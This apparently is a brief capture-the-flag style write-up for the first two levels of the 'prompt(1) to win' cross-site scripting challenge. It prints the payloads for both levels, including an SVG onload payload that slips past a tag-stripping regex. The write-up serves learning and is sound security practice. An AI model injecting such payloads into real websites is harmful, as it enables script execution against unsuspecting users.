# prompt(1) to win
### 0 
**Solve**

```html
"><script>prompt(1)</script>

```
<img width="500" src="https://user-images.githubusercontent.com/68285613/147693465-ee262fcc-5b5f-4933-9d9a-e8ab593cf366.png">

<br>

### 1
**Explain**

```JavaScript
var stripTagsRE = /<\/?[^>]+>/gi;
input = input.replace(stripTagsRE, '');
```
Need to bypass the input.replace part.

**Readings**
    - [What's the meaning of /gi in a regex? [duplicate]](https://stackoverflow.com/questions/27916055/whats-the-meaning-of-gi-in-a-regex/27916089)


**Solve**

*Remember to add a apace behind ```(1)```, so that it will be able to call prompt(1).*

``` JavaScript
<svg onload=prompt(1) 
```



<img width="500" src="https://user-images.githubusercontent.com/68285613/147695438-906a1682-fb06-4ee3-98b5-bee70ab631a3.png">

